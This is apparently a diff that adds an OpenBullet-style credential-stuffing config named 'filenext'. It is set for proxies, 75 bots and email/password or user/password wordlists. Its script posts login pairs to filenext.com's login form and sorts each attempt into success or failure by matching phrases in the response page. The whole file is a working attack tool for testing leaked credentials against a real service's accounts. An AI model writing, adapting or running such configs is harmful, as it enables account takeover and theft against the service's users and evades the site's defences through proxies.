@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "filenext",
+  "SuggestedBots": 75,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-25T00:08:13.8245432+02:00",
+  "AdditionalInfo": "",
+  "Author": "Brian",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.filenext.com/" 
+  CONTENT "op=login&token=&rand=&redirect=https%3A%2F%2Fwww.filenext.com%2F%3Fop%3Dregistration&login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.filenext.com" 
+  HEADER "referer: https://www.filenext.com/login.html" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Uploads are disabled for your user type" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect Login or Password" 
+
